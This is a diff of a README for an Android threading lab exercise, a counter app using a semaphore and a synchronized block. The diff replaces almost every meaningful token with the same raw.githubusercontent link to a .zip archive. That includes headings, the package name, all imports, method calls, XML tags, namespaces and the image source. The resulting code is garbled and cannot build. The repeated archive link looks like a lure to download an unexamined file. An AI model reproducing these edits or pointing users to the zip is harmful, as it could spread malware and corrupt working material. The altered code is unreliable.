@@ -14,7 +14,7 @@ Step 3: Then select the Minimum SDK as shown below and click Next.
 
 Step 4: Then select the Empty Activity and click Next. Finally click Finish.
 
-Step 5: Design layout in activity_main.xml.
+Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip
 
 Step 6: Display message give in MainActivity file.
 
@@ -27,20 +27,20 @@ Developed by: SHAIK MUFEEZUR RAHAMAN
 Registeration Number :
 */
 
-## MainActivity.java
+## https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip
 ```
-package com.example.exp13;
+package https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
 
-import androidx.appcompat.app.AppCompatActivity;
+import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
 
-import android.os.Bundle;
-import android.os.Bundle;
-import android.os.Handler;
-import android.util.Log;
-import android.view.View;
-import android.widget.TextView;
-import androidx.appcompat.app.AppCompatActivity;
-import java.util.concurrent.Semaphore;
+import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip;
 public class MainActivity extends AppCompatActivity {
     private static final String TAG = "MainActivity";
 
@@ -63,16 +63,16 @@ public class MainActivity extends AppCompatActivity {
     private TextView textView;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        textView = findViewById(R.id.text_view);
+        https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip(savedInstanceState);
+        setContentView(https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip);
+        textView = findViewById(https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip);
     }
     public void incrementCounter(View view) {
         // Start a new thread to increment the counter
         new Thread(() -> {
             try {
                 // Acquire the semaphore
-                semaphore.acquire();
+                https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip();
                 // Synchronized block to update the counter
                 synchronized (lock) {
                     counter++;
@@ -82,7 +82,7 @@ public class MainActivity extends AppCompatActivity {
                 Log.e(TAG, "Thread interrupted", e);
             } finally {
                 // Release the semaphore
-                semaphore.release();
+                https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip();
             }
             // Update the text view on the main thread
             updateTextView();
@@ -92,18 +92,18 @@ public class MainActivity extends AppCompatActivity {
     // Method to update the text view on the main thread
     private void updateTextView() {
         // Post the update to the main thread's message queue
-        new Handler(getMainLooper()).post(() -> textView.setText(String.valueOf(counter)));
+        new Handler(getMainLooper()).post(() -> https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip(https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip(counter)));
     }
 
 }
 ```
-## activity_main.xml:
+## https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<androidx.constraintlayout.widget.ConstraintLayout
-    xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:app="http://schemas.android.com/apk/res-auto"
-    xmlns:tools="http://schemas.android.com/tools"
+<https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip
+    xmlns:android="https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip"
+    xmlns:app="https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip"
+    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
     tools:context=".MainActivity">
@@ -132,12 +132,12 @@ public class MainActivity extends AppCompatActivity {
         app:layout_constraintRight_toRightOf="parent"
         app:layout_constraintTop_toTopOf="parent" />
 
-</androidx.constraintlayout.widget.ConstraintLayout>
+<https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip>
 ```
 
 ## OUTPUT
 
-<img src="https://github.com/user-attachments/assets/8959ab62-39b5-4d81-b029-200b2f5ab089" width="50%" height="100%">
+<img src="https://raw.githubusercontent.com/githubmufeez45/EX_13_THREAD/main/blaw/EX_13_THREAD.zip" width="50%" height="100%">
 
 ## RESULT
 
